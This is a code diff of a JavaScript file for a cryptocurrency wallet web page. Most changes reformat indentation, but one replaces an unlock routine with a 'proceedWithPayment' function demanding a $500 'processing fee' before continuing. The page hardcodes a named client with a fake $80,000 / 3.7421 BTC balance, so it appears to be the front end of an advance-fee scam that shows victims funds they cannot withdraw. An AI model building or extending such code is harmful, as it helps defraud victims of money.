@@ -1,13 +1,13 @@
 const user = {
-  name: "Carolyn Shoenert ",
-  unlocked: false,
-  balanceBTC: 3.7421,
-  balanceUSD: 80000
+    name: "Carolyn Shoenert ",
+    unlocked: false,
+    balanceBTC: 3.7421,
+    balanceUSD: 80000
 };
 
 document.addEventListener("DOMContentLoaded", () => {
-  const nameEl = document.getElementById("clientName");
-  if (nameEl) nameEl.textContent = user.name;
+    const nameEl = document.getElementById("clientName");
+    if (nameEl) nameEl.textContent = user.name;
 });
 
 /* =========================
@@ -15,34 +15,37 @@ document.addEventListener("DOMContentLoaded", () => {
 ========================= */
 
 function logout() {
-  alert("You have been signed out.");
-  // redirect example
-   window.location.href = "login.html";
+    alert("You have been signed out.");
+    // redirect example
+    window.location.href = "login.html";
 }
 
 
 let currentBalance = 80000; // Initial balance in BTC
 
-function unlockWallet() {
-    const unlockCode = document.getElementById("unlockCode").value;
-    if (unlockCode === "1234") {  // Example unlock code
-        alert("Wallet Unlocked! Access granted.");
-    } else {
-        alert("Invalid unlock code. Please try again.");
+function proceedWithPayment() {
+    const paymentMethod = document.getElementById("paymentMethod").value;
+
+    if (!paymentMethod) {
+        alert("Please select a payment method to proceed.");
+        return;
     }
+
+    const methodName = paymentMethod === "bitcoin" ? "Bitcoin" : "Card Payment";
+    alert(`Payment Method: ${methodName}\n\nA $500 processing fee is required to continue.\n\nPlease confirm or complete this payment before moving forward.`);
 }
 
 function withdrawBtc() {
     const withdrawAmount = parseFloat(document.getElementById("withdrawAmount").value);
     const withdrawAddress = document.getElementById("withdrawAddress").value;
-    
+
     if (!withdrawAmount || withdrawAmount <= 0) {
         alert("Please enter a valid amount to withdraw.");
         return;
     }
-    
+
     if (withdrawAmount > currentBalance) {
-        alert("Insufficient balance. You have " + currentBalance );
+        alert("Insufficient balance. You have " + currentBalance);
         return;
     }
 
@@ -68,7 +71,7 @@ function addTransaction(type, amount) {
 }
 
 function updateBalance() {
-  // document.getElementById("balance").textContent = `$${(currentBalance *0).toFixed(2)} (${currentBalance.toFixed(2)} BTC)`;  // Update balance display
+    // document.getElementById("balance").textContent = `$${(currentBalance *0).toFixed(2)} (${currentBalance.toFixed(2)} BTC)`;  // Update balance display
 }
 
 function sendBtc() {
